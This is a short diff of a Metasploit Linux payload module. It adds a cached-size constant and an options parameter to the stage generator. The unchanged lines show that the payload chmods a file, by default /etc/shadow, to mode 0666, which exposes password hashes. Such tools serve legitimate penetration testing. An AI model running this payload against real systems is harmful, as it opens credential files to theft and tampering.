@@ -11,6 +11,9 @@ require 'msf/core'
 #  Kris Katterjohn - 03/03/2008
 ###
 module Metasploit3
+
+  CachedSize = 36
+
   include Msf::Payload::Single
   include Msf::Payload::Linux
 
@@ -31,7 +34,7 @@ module Metasploit3
   end
 
   # Dynamically generates chmod(FILE, MODE) + exit()
-  def generate_stage
+  def generate_stage(opts={})
     file    = datastore['FILE'] || '/etc/shadow'
     mode	= (datastore['MODE'] || "0666").oct
 
